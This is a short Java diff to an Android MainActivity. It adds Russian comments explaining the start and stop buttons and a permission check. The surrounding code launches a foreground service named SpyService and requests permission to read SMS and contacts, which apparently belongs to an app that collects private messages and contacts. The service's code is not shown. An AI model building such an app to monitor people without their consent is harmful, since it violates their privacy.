@@ -30,15 +30,18 @@ public class MainActivity extends AppCompatActivity {
         startButton = findViewById(R.id.start_button);
         stopButton = findViewById(R.id.stop_button);
 
+        // Кнопка start начинает выполнение фоновой задачи
         startButton.setOnClickListener(v -> {
             startForegroundService(new Intent(MainActivity.this, SpyService.class));
         });
 
+        // Кнопка stop завершает выполнение фоновой задачи
         stopButton.setOnClickListener(v -> {
             stopService(new Intent(MainActivity.this, SpyService.class));
         });
 
         int REQUEST_PHONE_CALL = 1;
+        // Проверим выданы ли приложению необходимые права, если нет, то они будут запрошены
         ActivityCompat.requestPermissions(MainActivity.this, new String[]{
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CONTACTS,
